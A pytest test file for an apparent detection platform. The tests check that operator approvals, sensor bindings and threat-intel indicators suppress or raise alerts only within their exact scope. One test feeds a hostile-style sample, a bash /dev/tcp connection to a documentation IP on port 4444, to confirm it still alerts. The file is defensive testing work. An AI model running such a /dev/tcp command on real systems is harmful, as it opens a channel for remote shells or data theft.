"""Operator context must never become an event-supplied allowlist."""

import hashlib
import os
from concurrent.futures import ThreadPoolExecutor
from copy import deepcopy
from unittest.mock import patch

import pytest
from conftest import configuration, headers
from fastapi.testclient import TestClient
from sentinelforge.api import create_app
from sentinelforge.db import Base
from sentinelforge.engine import detect

PS = "00000000-0000-0000-0000-000000000002"
TASK = "00000000-0000-0000-0000-000000000004"
FILE = "00000000-0000-0000-0000-000000000008"
HTTPS = "00000000-0000-0000-0000-000000000009"
STAMP = "2026-11-16T10:00:00.000000+00:00"
FUTURE = "2026-11-17T10:00:00.000000+00:00"


@pytest.fixture
def context_client():
    clock = [STAMP]
    app = create_app(
        configuration(os.environ.get("SF_TEST_DATABASE_URL", "sqlite:///:memory:")),
        clock=lambda: clock[0],
    )
    Base.metadata.drop_all(app.state.engine)
    Base.metadata.create_all(app.state.engine)
    with TestClient(app) as client:
        yield client, clock
    app.state.engine.dispose()


def event(**changes):
    payload = {
        "host": "workstation-01",
        "user": "corp\\operator",
        "timestamp": STAMP,
        "kind": "process",
        "process": "C:\\Windows\\powershell.exe",
        "command": "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAbwBrACcA",
    }
    payload.update(changes)
    return {"source": "synthetic", "sensor": "enrolled-sensor", "payload": payload}


def binding(client, **changes):
    body = {
        "principal": "collector",
        "source": "synthetic",
        "sensor": "enrolled-sensor",
        "host": "workstation-01",
        "expires_at": FUTURE,
        "reason": "Operator verified the collector enrollment out of band",
    } | changes
    response = client.post("/api/context/bindings", json=body, headers=headers())
    assert response.status_code == 201, response.text
    return response.json()


def approval(client, bound, item=None, **changes):
    item = item or event()
    body = {
        "binding_id": bound["id"],
        "rule_id": PS,
        "user": "corp\\operator",
        "command_sha256": hashlib.sha256(item["payload"]["command"].encode()).hexdigest(),
        "valid_from": STAMP,
        "valid_until": "2026-11-16T10:05:00Z",
        "expires_at": FUTURE,
        "reason": "Reviewed this exact administrative action for the maintenance window",
    } | changes
    response = client.post("/api/context/approvals", json=body, headers=headers())
    assert response.status_code == 201, response.text
    return response.json()


def ingest(client, item, actor="collector"):
    response = client.post("/api/ingest", json={"events": [item]}, headers=headers(actor))
    assert response.status_code == 200, response.text
    assert response.json()["rejected"] == 0
    return response.json()


def rule_ids(client):
    return {a["rule_id"] for a in client.get("/api/alerts", headers=headers()).json()["items"]}


def indicator(client, **changes):
    body = {
        "kind": "ip",
        "value": "8.8.4.4",
        "purpose": "https-c2",
        "version": "synthetic-feed-v1",
        "provenance": "Synthetic lab intelligence, not a real reputation assertion",
        "reason": "Synthetic independent intelligence observation for this experiment",
        "valid_from": "2026-11-16T09:00:00Z",
        "valid_until": "2026-11-17T09:00:00Z",
        "expires_at": FUTURE,
    } | changes
    response = client.post("/api/context/indicators", json=body, headers=headers())
    assert response.status_code == 201, response.text
    return response.json()


def test_valid_approval_preserves_evidence_and_single_use_audit(context_client):
    client, _ = context_client
    bound = binding(client)
    approved = approval(client, bound)
    item = event()
    first = ingest(client, item)
    assert first["accepted"] == 1 and first["alerts_created"] == 0
    event_id = first["results"][0]["event_id"]
    raw = client.get("/api/events/" + event_id, headers=headers()).json()
    assert raw["raw"]["payload"] == item["payload"]
    suppressions = client.get("/api/context/suppressions", headers=headers()).json()
    assert suppressions["total"] == 1
    detail = suppressions["items"][0]["detail"]
    assert detail["event_id"] == event_id and detail["approval_id"] == approved["id"]
    assert detail["rule_id"] == PS and detail["binding_id"] == bound["id"]
    assert len(detail["context_sha256"]) == 64 and detail["reason"]
    assert ingest(client, item)["duplicates"] == 1
    replay = deepcopy(item)
    replay["payload"]["external_id"] = "changed-replay-id"
    assert ingest(client, replay)["alerts_created"] == 1
    assert rule_ids(client) == {PS}
    assert client.get("/api/context/suppressions", headers=headers()).json()["total"] == 1


@pytest.mark.parametrize(
    "scope_changes,event_changes,actor",
    [
        ({}, {"host": "wrong-host"}, "collector"),
        ({}, {"user": "corp\\other"}, "collector"),
        ({}, {"command": "powershell.exe -enc AAAA"}, "collector"),
        ({"command_sha256": "0" * 64}, {}, "collector"),
        ({"rule_id": TASK}, {}, "collector"),
        ({"expires_at": STAMP}, {}, "collector"),
        ({"valid_from": "2026-11-16T10:01:00Z"}, {}, "collector"),
        ({}, {"timestamp": "2026-11-16T10:05:00Z"}, "collector"),
        ({}, {}, "lead"),
    ],
)
def test_mismatched_or_expired_approvals_never_suppress(context_client, scope_changes, event_changes, actor):
    client, _ = context_client
    approval(client, binding(client), **scope_changes)
    assert ingest(client, event(**event_changes), actor)["alerts_created"] == 1
    assert client.get("/api/context/suppressions", headers=headers()).json()["total"] == 0


def test_binding_expiry_revocation_and_sensor_scope(context_client):
    client, clock = context_client
    bound = binding(client)
    approved = approval(client, bound)
    item = event()
    item["sensor"] = "unregistered-sensor"
    assert ingest(client, item)["alerts_created"] == 1
    clock[0] = FUTURE
    assert ingest(client, event(external_id="expired-binding"))["alerts_created"] == 1
    clock[0] = STAMP
    assert (
        client.post(f"/api/context/approvals/{approved['id']}/revoke", headers=headers()).status_code == 200
    )
    assert ingest(client, event(external_id="revoked-approval"))["alerts_created"] == 1
    approval(client, bound, valid_until="2026-11-16T10:06:00Z")
    assert client.post(f"/api/context/bindings/{bound['id']}/revoke", headers=headers()).status_code == 200
    assert ingest(client, event(external_id="revoked-binding"))["alerts_created"] == 1


def test_approved_account_still_alerts_on_another_action(context_client):
    client, _ = context_client
    bound = binding(client)
    approval(client, bound)
    attack = event(process="/bin/bash", command="bash -c 'echo x >/dev/tcp/192.0.2.1/4444'")
    assert ingest(client, attack)["alerts_created"] == 1
    assert rule_ids(client) == {"00000000-0000-0000-0000-000000000003"}


def test_forged_event_context_cannot_suppress_or_manufacture_alerts(context_client):
    client, _ = context_client
    forged = {"approved": True, "approval_id": "fake", "sf_powershell_encoded": False}
    assert ingest(client, event(fields=forged))["alerts_created"] == 1
    assert rule_ids(client) == {PS}
    forged.update(sf_powershell_file_suspicious=True, sf_https_indicator=True)
    benign = event(command="powershell.exe -File inventory.ps1", fields=forged)
    assert ingest(client, benign)["alerts_created"] == 0


@pytest.mark.parametrize("actor", ["analyst", "viewer", "collector"])
def test_only_admin_can_manage_context(context_client, actor):
    client, _ = context_client
    body = {
        "principal": "collector",
        "source": "synthetic",
        "sensor": "s",
        "host": "h",
        "expires_at": FUTURE,
        "reason": "Administrator enrollment only",
    }
    assert client.post("/api/context/bindings", json=body, headers=headers(actor)).status_code == 403
    for kind in ["bindings", "approvals", "indicators"]:
        assert client.get("/api/context/" + kind, headers=headers(actor)).status_code == 403
    assert client.get("/api/context/bindings").status_code == 401


def test_context_validation_rejects_malformed_and_unknown_scope(context_client):
    client, _ = context_client
    bound = binding(client)
    good = approval(client, bound)
    body = {
        k: good[k]
        for k in [
            "binding_id",
            "rule_id",
            "user",
            "command_sha256",
            "valid_from",
            "valid_until",
            "expires_at",
            "reason",
        ]
    }
    for changes in [
        {"rule_id": FILE},
        {"rule_id": HTTPS},
        {"command_sha256": "not-a-hash"},
        {"user": " "},
        {"expires_at": "2026-11-16"},
        {"valid_until": "2026-11-15T10:00:00Z"},
        {"binding_id": "no-such-binding"},
        {"approved": True},
        {"reason": ""},
    ]:
        response = client.post("/api/context/approvals", json=body | changes, headers=headers())
        assert response.status_code == 422, response.text
    binding_body = {
        "principal": "viewer",
        "source": "synthetic",
        "sensor": "s",
        "host": "h",
        "expires_at": FUTURE,
        "reason": "Cannot grant ingestion to a viewer",
    }
    assert client.post("/api/context/bindings", json=binding_body, headers=headers()).status_code == 422


def test_https_intelligence_requires_binding_and_preserves_provenance(context_client):
    client, _ = context_client
    intel = indicator(client)
    traffic = event(kind="network", command=None, process=None, dst_ip="8.8.4.4", dst_port=443)
    assert ingest(client, traffic)["alerts_created"] == 0
    binding(client)
    traffic["payload"]["external_id"] = "bound-observation"
    result = ingest(client, traffic)
    assert result["alerts_created"] == 1 and rule_ids(client) == {HTTPS}
    alert = client.get("/api/alerts", headers=headers()).json()["items"][0]
    assert alert["event_ids"] == [result["results"][0]["event_id"]]
    assert intel["id"] in alert["explanation"] and intel["version"] in alert["explanation"]
    assert "Synthetic lab intelligence" in alert["explanation"]


@pytest.mark.parametrize("mode", ["expired", "wrong-ip", "wrong-port", "revoked", "wrong-time"])
def test_no_https_signal_without_current_matching_intelligence(context_client, mode):
    client, _ = context_client
    binding(client)
    intel = indicator(client, **({"expires_at": STAMP} if mode == "expired" else {}))
    if mode == "revoked":
        assert (
            client.post(f"/api/context/indicators/{intel['id']}/revoke", headers=headers()).status_code == 200
        )
    traffic = event(kind="network", process=None, command=None, dst_ip="8.8.4.4", dst_port=443)
    if mode == "wrong-ip":
        traffic["payload"]["dst_ip"] = "9.9.9.9"
    if mode == "wrong-port":
        traffic["payload"]["dst_port"] = 80
    if mode == "wrong-time":
        traffic["payload"]["timestamp"] = "2026-11-17T09:00:00Z"
    assert ingest(client, traffic)["alerts_created"] == 0


def test_versioned_intelligence_is_immutable_and_strict(context_client):
    client, _ = context_client
    good = indicator(client)
    fields = [
        "kind",
        "value",
        "purpose",
        "version",
        "provenance",
        "reason",
        "valid_from",
        "valid_until",
        "expires_at",
    ]
    body = {key: good[key] for key in fields}
    assert (
        client.post(
            "/api/context/indicators", json=body | {"reason": "Changed assertion"}, headers=headers()
        ).status_code
        == 409
    )
    assert (
        client.patch(f"/api/context/indicators/{good['id']}", json=body, headers=headers()).status_code == 405
    )
    for changes in [
        {"kind": "sha256"},
        {"purpose": "unknown"},
        {"value": "127.0.0.1"},
        {"value": "https://example.com"},
        {"version": ""},
        {"provenance": ""},
        {"valid_from": "bad"},
    ]:
        assert (
            client.post("/api/context/indicators", json=body | changes, headers=headers()).status_code == 422
        )


def test_task_approval_is_scoped_to_exact_action(context_client):
    client, _ = context_client
    item = event(
        process="C:\\Windows\\schtasks.exe", command="schtasks /create /tn Inventory /tr inventory.exe"
    )
    approval(client, binding(client), item, rule_id=TASK)
    assert ingest(client, item)["alerts_created"] == 0
    item["payload"]["command"] = "schtasks /create /tn Inventory /tr different.exe"
    assert ingest(client, item)["alerts_created"] == 1
    assert rule_ids(client) == {TASK}


def test_concurrent_approval_consumes_once(context_client):
    client, _ = context_client
    approval(client, binding(client))
    items = [event(external_id=f"unique-{index}") for index in range(8)]
    with ThreadPoolExecutor(max_workers=4) as pool:
        results = list(pool.map(lambda item: ingest(client, item), items))
    assert sum(result["accepted"] for result in results) == 8
    assert sum(result["alerts_created"] for result in results) == 7
    assert client.get("/api/context/suppressions", headers=headers()).json()["total"] == 1


def test_approval_and_audit_rollback_with_failed_ingestion(context_client):
    client, _ = context_client
    approval(client, binding(client))

    def fail_after_detection(*args, **kwargs):
        detect(*args, **kwargs)
        raise RuntimeError("Synthetic downstream transaction failure")

    with patch("sentinelforge.api.detect", side_effect=fail_after_detection):
        with pytest.raises(RuntimeError, match="Synthetic downstream"):
            ingest(client, event())
    assert client.get("/api/events", headers=headers()).json()["total"] == 0
    assert client.get("/api/context/suppressions", headers=headers()).json()["total"] == 0
    assert ingest(client, event())["alerts_created"] == 0
    assert client.get("/api/context/suppressions", headers=headers()).json()["total"] == 1


def test_script_reputation_requires_observed_path_hash_and_enrollment(context_client):
    client, _ = context_client
    script_hash = hashlib.sha256(b"synthetic observed script content").hexdigest()
    intel = indicator(client, kind="sha256", value=script_hash, purpose="powershell-script")
    base = event(
        command='powershell.exe -File "C:\\Scripts\\inventory.ps1"',
        fields={
            "script_path": "C:\\Scripts\\inventory.ps1",
            "script_sha256": script_hash,
        },
    )
    assert ingest(client, base)["alerts_created"] == 0
    binding(client)
    for key, value in [
        ("script_path", "C:\\Scripts\\another.ps1"),
        ("script_sha256", "0" * 64),
        ("script_sha256", [script_hash]),
        ("script_path", None),
    ]:
        item = deepcopy(base)
        item["payload"]["fields"][key] = value
        assert ingest(client, item)["alerts_created"] == 0
    good = deepcopy(base)
    good["payload"]["external_id"] = "verified-script-observation"
    result = ingest(client, good)
    assert result["alerts_created"] == 1 and rule_ids(client) == {FILE}
    alert = client.get("/api/alerts", headers=headers()).json()["items"][0]
    assert intel["id"] in alert["explanation"]
    audit = client.get("/api/audit", headers=headers()).json()["items"]
    matched = next(item for item in audit if item["action"] == "detection.enriched")
    assert matched["detail"]["indicator"]["value"] == script_hash
    assert matched["detail"]["event_id"] == result["results"][0]["event_id"]
    raw = client.get("/api/events/" + result["results"][0]["event_id"], headers=headers()).json()
    assert raw["data"]["fields"] == good["payload"]["fields"]


def test_unused_indicator_is_not_claimed_as_ancestry_evidence(context_client):
    client, _ = context_client
    script_hash = "a" * 64
    intel = indicator(client, kind="sha256", value=script_hash, purpose="powershell-script")
    binding(client)
    item = event(
        command="powershell.exe -WindowStyle Hidden -File actual.ps1",
        parent="C:\\Office\\WINWORD.EXE",
        fields={"script_path": "wrong.ps1", "script_sha256": script_hash},
    )
    assert ingest(client, item)["alerts_created"] == 1
    alert = client.get("/api/alerts", headers=headers()).json()["items"][0]
    assert intel["id"] not in alert["explanation"]
    assert "Office parent" in alert["explanation"]
    audit = client.get("/api/audit", headers=headers()).json()["items"]
    assert not any(item["action"] == "detection.enriched" for item in audit)


def test_context_errors_revocation_and_expired_creation_are_auditable(context_client):
    client, _ = context_client
    binding(client, expires_at=STAMP)
    audit = client.get("/api/audit", headers=headers()).json()["items"]
    creation = next(item for item in audit if item["action"] == "context.binding.created")
    assert creation["detail"]["active_at_creation"] is False
    bound = binding(client)
    path = "/api/context/bindings/" + bound["id"] + "/revoke"
    assert client.post(path, headers=headers("analyst")).status_code == 403
    assert client.post(path, headers=headers()).status_code == 200
    assert client.post(path, headers=headers()).status_code == 409
    assert client.post("/api/context/bindings/missing/revoke", headers=headers()).status_code == 404
    assert client.post("/api/context/unknown/missing/revoke", headers=headers()).status_code == 404
    assert client.get("/api/context/unknown", headers=headers()).status_code == 404
    assert client.get("/api/context/suppressions", headers=headers("viewer")).status_code == 403
    assert client.get("/api/context/suppressions", headers=headers("analyst")).status_code == 200


def test_unbound_first_delivery_cannot_preempt_bound_context(context_client):
    client, _ = context_client
    binding(client)
    indicator(client)
    traffic = event(kind="network", command=None, process=None, dst_ip="8.8.4.4", dst_port=443)
    assert ingest(client, traffic, actor="lead")["alerts_created"] == 0
    second = ingest(client, traffic)
    assert second["duplicates"] == 1 and second["accepted"] == 0
    assert second["alerts_created"] == 1
    assert rule_ids(client) == {HTTPS}
    assert ingest(client, traffic)["alerts_created"] == 0
    assert client.get("/api/events", headers=headers()).json()["total"] == 1


def test_reposting_same_approval_does_not_issue_a_second_grant(context_client):
    client, _ = context_client
    bound = binding(client)
    grant = approval(client, bound)
    assert ingest(client, event())["alerts_created"] == 0
    body = {
        key: grant[key]
        for key in [
            "binding_id",
            "rule_id",
            "user",
            "command_sha256",
            "valid_from",
            "valid_until",
            "expires_at",
            "reason",
        ]
    }
    assert client.post("/api/context/approvals", json=body, headers=headers()).status_code == 409
    assert ingest(client, event(external_id="retry-grant"))["alerts_created"] == 1
